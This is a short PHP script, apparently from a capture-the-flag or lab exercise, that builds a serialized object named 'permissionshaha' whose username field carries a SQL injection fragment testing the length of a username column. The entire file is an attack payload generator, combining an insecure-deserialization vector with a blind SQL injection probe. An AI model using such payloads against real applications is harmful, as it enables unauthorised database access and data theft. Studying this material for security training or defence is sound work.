<?php
	class permissionshaha{
		public $username = "guest' AND LENGTH(username) = '100";
		public $password = "guest";
	}

	$obj = new permissionshaha();
	var_dump(serialize($obj));
?>
